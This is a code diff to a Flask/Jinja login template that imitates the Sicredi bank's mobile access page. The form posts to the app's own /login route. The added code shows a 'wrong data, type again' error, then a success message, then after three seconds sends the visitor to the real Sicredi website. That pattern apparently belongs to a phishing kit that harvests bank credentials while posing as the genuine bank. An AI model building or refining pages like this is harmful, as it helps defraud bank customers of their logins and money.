@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sicredi - Acesso Móvel</title>
-    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
     
     <style>
         :root {
@@ -13,60 +12,43 @@
             --bg-gray: #f4f4f4;
             --text-gray: #333;
             --border-gray: #cdd3cd;
+            --error-red: #e74c3c;
         }
 
-        /* Estrutura para manter o footer sempre no final */
-        html, body { 
-            height: 100%; 
-            margin: 0; 
-            padding: 0; 
+        /* Estilos das Mensagens */
+        .alert {
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .alert-error {
+            background-color: #fdeaea;
+            color: var(--error-red);
+            border: 1px solid var(--error-red);
+        }
+        .alert-success {
+            background-color: #eafdea;
+            color: var(--sicredi-green);
+            border: 1px solid var(--sicredi-green);
         }
 
-        body { 
-            display: flex; 
-            flex-direction: column; 
-            font-family: 'Helvetica', Arial, sans-serif; 
-            background-color: var(--bg-gray); 
-        }
-
-        .main-wrapper { 
-            flex: 1 0 auto; 
-        }
-
+        html, body { height: 100%; margin: 0; padding: 0; }
+        body { display: flex; flex-direction: column; font-family: 'Helvetica', Arial, sans-serif; background-color: var(--bg-gray); }
+        .main-wrapper { flex: 1 0 auto; }
         header { background-color: #fff; padding: 20px; text-align: center; border-bottom: 4px solid var(--sicredi-green); }
-        
-        /* Ajuste na classe da logo para garantir o tamanho correto */
         .logo-img { max-width: 150px; height: auto; }
-        
         .main-container { padding: 20px; max-width: 500px; margin: 0 auto; }
         .login-card { background: #fff; border-radius: 8px; padding: 24px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         h2 { color: var(--sicredi-green); margin-top: 0; font-size: 22px; }
-        
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; }
         input { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid var(--border-gray); border-radius: 4px; font-size: 16px; }
-        
         .btn-primary { background-color: var(--sicredi-green); color: white; border: none; padding: 15px; width: 100%; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; }
-
-        /* Centralização do Cadeado */
-        #divBlindagem {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 40px 0;
-            width: 100%;
-        }
-
-        /* Footer fixo no rodapé */
-        #footer {
-            flex-shrink: 0;
-            background-color: var(--sicredi-dark-green);
-            color: white;
-            text-align: center;
-            padding: 20px 0;
-            width: 100%;
-        }
-        
+        #divBlindagem { display: flex; justify-content: center; align-items: center; padding: 40px 0; width: 100%; }
+        #footer { flex-shrink: 0; background-color: var(--sicredi-dark-green); color: white; text-align: center; padding: 20px 0; width: 100%; }
         .footer-links { display: flex; justify-content: center; gap: 15px; margin-top: 10px; }
         #footer a { font-size: 13px; color: white; text-decoration: underline; }
     </style>
@@ -81,6 +63,22 @@
         <div class="main-container">
             <div class="login-card">
                 <h2>Acessar</h2>
+
+                {% if status == 'erro' %}
+                    <div class="alert alert-error">
+                        Dados incorretos, digite novamente.
+                    </div>
+                {% elif status == 'sucesso' %}
+                    <div class="alert alert-success">
+                        Verificação feita com sucesso ✅
+                    </div>
+                    <script>
+                        setTimeout(function(){
+                            window.location.href = "https://www.sicredi.com.br";
+                        }, 3000);
+                    </script>
+                {% endif %}
+
                 <form id="loginForm" action="/login" method="POST">
                     <div class="form-group">
                         <label for="coop">Cooperativa</label>
